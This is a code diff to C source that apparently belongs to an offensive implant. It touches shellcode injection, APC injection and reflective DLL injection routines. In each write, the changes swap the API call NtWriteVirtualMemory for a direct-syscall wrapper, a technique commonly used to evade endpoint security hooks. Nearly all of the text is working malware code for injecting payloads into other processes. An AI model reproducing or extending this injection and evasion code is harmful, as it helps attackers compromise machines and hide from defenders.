@@ -212,7 +212,7 @@ BOOL ShellcodeInjectionSys( LPVOID lpShellcodeBytes, SIZE_T ShellcodeSize, PINJE
     else
         PUTS("[+] NtAllocateVirtualMemory: Successful");
 
-    NtStatus = Instance.Win32.NtWriteVirtualMemory( ctx->hProcess, lpVirtualMemory, lpShellcodeBytes, ShellcodeSize, &ShellcodeSize );
+    NtStatus = SysNtWriteVirtualMemory( ctx->hProcess, lpVirtualMemory, lpShellcodeBytes, ShellcodeSize, &ShellcodeSize );
     if ( ! NT_SUCCESS( NtStatus ) )
     {
         PUTS("[-] NtWriteVirtualMemory: failed")
@@ -264,7 +264,7 @@ BOOL ShellcodeInjectionSysApc( HANDLE hProcess, LPVOID lpShellcodeBytes, SIZE_T 
         ShellcodeArg = MemoryAlloc( DX_MEM_DEFAULT, hProcess, ctx->ParameterSize, PAGE_READWRITE );
         if ( ShellcodeArg )
         {
-            NtStatus = Instance.Win32.NtWriteVirtualMemory( hProcess, ShellcodeArg, ctx->Parameter, ctx->ParameterSize, &BytesWritten );
+            NtStatus = SysNtWriteVirtualMemory( hProcess, ShellcodeArg, ctx->Parameter, ctx->ParameterSize, &BytesWritten );
             if ( ! NT_SUCCESS( NtStatus ) )
             {
                 PUTS( "[-] NtWriteVirtualMemory: Failed" )
@@ -278,7 +278,7 @@ BOOL ShellcodeInjectionSysApc( HANDLE hProcess, LPVOID lpShellcodeBytes, SIZE_T 
     {
         PUTS("[+] MemoryAlloc: Successful")
 
-        NtStatus = Instance.Win32.NtWriteVirtualMemory( hProcess, lpVirtualMemory, lpShellcodeBytes, ShellcodeSize, &ShellcodeSize );
+        NtStatus = SysNtWriteVirtualMemory( hProcess, lpVirtualMemory, lpShellcodeBytes, ShellcodeSize, &ShellcodeSize );
         if ( NT_SUCCESS( NtStatus ) )
         {
             PUTS("[+] Moved memory: Successful")
@@ -417,7 +417,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
     if ( MemLibraryBuffer )
     {
         PUTS( "[+] NtAllocateVirtualMemory: success" );
-        if ( NT_SUCCESS( NtStatus = Instance.Win32.NtWriteVirtualMemory( hTargetProcess, MemLibraryBuffer, FullDll, FullDllSize, &BytesWritten ) ) )
+        if ( NT_SUCCESS( NtStatus = SysNtWriteVirtualMemory( hTargetProcess, MemLibraryBuffer, FullDll, FullDllSize, &BytesWritten ) ) )
         {
             // TODO: check to get the .text section and size of it
             PRINTF( "[+] NtWriteVirtualMemory: success: ptr[%p]\n", MemLibraryBuffer );
@@ -499,8 +499,9 @@ DWORD DllSpawnReflective( LPVOID DllLdr, DWORD DllLdrSize, LPVOID DllBuffer, DWO
         {
             PUTS( "Failed" )
 
-            if ( ! Instance.Win32.TerminateProcess( ProcessInfo.hProcess, 0 ) )
+            if ( ! Instance.Win32.TerminateProcess( ProcessInfo.hProcess, 0 ) ) {
                 PRINTF( "(Not major) Failed to Terminate Process: %d\n", NtGetLastError()  )
+            }
 
             SysNtClose( ProcessInfo.hProcess );
             SysNtClose( ProcessInfo.hThread );
